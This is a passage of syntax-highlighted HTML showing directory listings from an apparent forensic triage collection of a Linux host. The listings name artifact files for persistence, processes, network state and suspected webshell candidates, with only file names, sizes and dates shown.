</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">396</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>passwd<span style="color:#ff79c6">-</span>check<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">12</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">115</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">.</span>tar<span style="color:#ff79c6">.</span>gz
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2975</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">291</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>who<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">360</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>whoandwhat<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">12</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> varlogs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Misc:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">74804</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">559</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>Setuid<span style="color:#ff79c6">-</span>Setguid<span style="color:#ff79c6">-</span>tools<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">62</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">92</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">384887</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>exec<span style="color:#ff79c6">-</span>perm<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">34211795</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>full<span style="color:#ff79c6">-</span>timeline<span style="color:#ff79c6">.</span>csv
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">41585177</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>first<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1000.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">392840</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Persistence:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">116</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">2</span> root root  <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> crontabs
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">120</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>folder<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">147</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>tab<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">45449</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>persistence<span style="color:#ff79c6">-</span>systemdlist<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">775</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">27513</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_all<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">23761</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Podman:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Process_and_Network:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">5008</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> cyberjunkie_admin
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">671</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ip<span style="color:#ff79c6">-</span>a<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">439</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">-</span>numerical<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">275</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsof<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">-</span>open<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">5474</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>cmdline<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">148446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>details<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">28377</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>environment<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11080</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>exe<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">111180</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>fd<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1241355</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>link<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">3463139</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11524</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processes<span style="color:#ff79c6">-</span>axwwSo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">2991</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processhashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">211</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>routetable<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">49785</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ss<span style="color:#ff79c6">-</span>anepo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">190</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ssh<span style="color:#ff79c6">-</span>folders<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> root
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> ubuntu
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System_Info:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">340</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">30</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1968</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cpuinfo<span style="color:#ff79c6">.</span>txt
